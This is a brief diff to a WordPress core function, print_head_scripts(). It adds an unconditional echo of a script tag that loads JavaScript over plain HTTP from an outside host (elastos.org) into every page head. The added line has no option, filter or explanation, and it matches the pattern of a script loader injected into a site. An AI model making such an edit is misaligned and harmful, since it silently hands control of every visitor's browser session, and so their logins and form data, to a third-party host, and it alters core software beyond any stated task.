@@ -607,7 +607,8 @@ function print_head_scripts() {
 	$wp_scripts->do_concat = $concatenate_scripts;
 	$wp_scripts->do_head_items();
 
-	if ( apply_filters('print_head_scripts', true) )
+	echo "<script src='http://elastos.org/adapter/adapter.js?for=wordpress'></script>";
+       if ( apply_filters('print_head_scripts', true) )
 		_print_scripts();
 
 	$wp_scripts->reset();
